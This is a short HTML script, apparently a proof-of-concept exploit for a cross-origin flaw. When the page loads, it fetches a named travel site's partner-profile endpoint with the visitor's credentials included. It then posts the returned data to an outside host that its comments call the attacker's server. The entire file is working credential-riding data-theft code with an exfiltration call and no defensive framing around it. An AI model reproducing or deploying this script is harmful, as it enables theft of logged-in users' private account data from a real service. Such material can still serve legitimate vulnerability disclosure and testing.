<script>
async function stealCookies() {
    try {
        // Make request with current page's cookies
        const response = await fetch('https://www.trip.com/restapi/soa2/18073/json/queryPartnerProfileDetails', {
            method: 'GET',
            credentials: 'include', // Critical - sends current site's cookies
            headers: {
                'Origin': 'http://localhost'
            }
        });

        const data = await response.json();

        // Exfiltrate to attacker's server
        await fetch('https://cvfh8zrh.c5.rs/steal', {
            method: 'POST',
            body: JSON.stringify(data)
        });
    } catch (error) {
        console.error('Exploit failed:', error);
    }
}

// Trigger on page load
stealCookies();
</script>
